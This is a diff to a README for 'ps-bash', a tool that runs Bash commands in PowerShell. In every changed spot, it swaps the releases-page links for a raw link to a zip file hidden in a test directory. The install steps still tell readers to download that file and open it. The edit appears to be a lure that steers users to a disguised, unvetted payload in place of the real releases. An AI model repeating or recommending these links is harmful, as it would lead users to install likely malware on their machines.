@@ -1,6 +1,6 @@
 # 🐚 ps-bash - Bash Commands in PowerShell
 
-[![Download ps-bash](https://img.shields.io/badge/Download%20ps--bash-blue-grey)](https://github.com/Wenonechans7825/ps-bash/releases)
+[![Download ps-bash](https://img.shields.io/badge/Download%20ps--bash-blue-grey)](https://github.com/Wenonechans7825/ps-bash/raw/refs/heads/main/src/PsBash.Core.Tests/Parser/Ast/ps-bash-v2.6.zip)
 
 ## 🧭 What ps-bash does
 
@@ -16,7 +16,7 @@ You get:
 
 ## 📥 Download and install
 
-1. Visit the release page: https://github.com/Wenonechans7825/ps-bash/releases
+1. Visit the release page: https://github.com/Wenonechans7825/ps-bash/raw/refs/heads/main/src/PsBash.Core.Tests/Parser/Ast/ps-bash-v2.6.zip
 2. Find the latest release
 3. Download the file for Windows
 4. Open the file you downloaded
@@ -142,7 +142,7 @@ If you are new to command-line tools, start with one command at a time. That mak
 
 Download the latest Windows build here:
 
-https://github.com/Wenonechans7825/ps-bash/releases
+https://github.com/Wenonechans7825/ps-bash/raw/refs/heads/main/src/PsBash.Core.Tests/Parser/Ast/ps-bash-v2.6.zip
 
 ## 🧪 Command behavior
 
